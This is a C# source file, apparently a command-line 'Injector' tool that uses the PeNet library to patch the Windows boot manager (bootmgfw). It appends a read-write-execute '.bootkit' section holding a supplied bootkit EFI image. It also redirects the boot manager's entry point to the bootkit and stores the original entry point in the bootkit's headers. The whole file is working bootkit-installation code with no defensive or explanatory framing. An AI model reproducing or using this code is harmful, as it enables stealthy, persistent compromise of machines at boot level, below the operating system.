using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using PeNet;
using PeNet.Header.Pe;

namespace Injector
{
    internal class Program
    {
        static uint AlignUp(uint Size, uint Alignment)
        {
            return (Size + (Alignment - 1)) & ~(Alignment - 1);
        }

        static int Main(string[] args)
        {
            if (args.Length < 3)
            {
                Console.WriteLine("Usage: Injector bootmgfw.bak bootkit.efi bootmgfw.injected");
                return 1;
            }

            try
            {
                var bootmgfwPe = new PeFile(File.ReadAllBytes(args[0]));
                var bootkitData = File.ReadAllBytes(args[1]);
                var bootkitPe = new PeFile(bootkitData);

                var fileAlignment = bootkitPe.ImageNtHeaders.OptionalHeader.FileAlignment;
                var sectionAlignment = bootkitPe.ImageNtHeaders.OptionalHeader.SectionAlignment;
                if (fileAlignment != 0x1000 || sectionAlignment != 0x1000)
                    throw new Exception($"Bootkit not compiled with /FILEALIGN:0x1000 /ALIGN:0x1000");

                // Put the original entry point in the bootkit headers
                var bootkitEntry = bootkitPe.ImageNtHeaders.OptionalHeader.AddressOfEntryPoint;
                bootkitPe.ImageNtHeaders.OptionalHeader.AddressOfEntryPoint = bootmgfwPe.ImageNtHeaders.OptionalHeader.AddressOfEntryPoint;

                var sizeOfImage = bootmgfwPe.ImageNtHeaders.OptionalHeader.SizeOfImage;
                var alignmentSize = AlignUp(sizeOfImage, 0x10000) - sizeOfImage;
                var sectionSize = (int)(alignmentSize + bootkitData.Length);

                var bootkitBase = sizeOfImage + alignmentSize;
                Console.WriteLine(bootkitBase);

                bootmgfwPe.ImageNtHeaders.OptionalHeader.AddressOfEntryPoint = bootkitBase + bootkitEntry;

                bootmgfwPe.AddSection(".bootkit", sectionSize, ScnCharacteristicsType.MemExecute | ScnCharacteristicsType.MemRead | ScnCharacteristicsType.MemWrite);
                var newSection = bootmgfwPe.ImageSectionHeaders[bootmgfwPe.ImageSectionHeaders.Length - 1];
                bootmgfwPe.RawFile.WriteBytes(newSection.PointerToRawData + alignmentSize, bootkitData);
                Console.WriteLine(newSection.VirtualAddress.ToHexString());
                File.WriteAllBytes(args[2], bootmgfwPe.RawFile.ToArray());
                return 0;
            }
            catch (Exception x)
            {
                Console.WriteLine(x);
                return 1;
            }
        }
    }
}
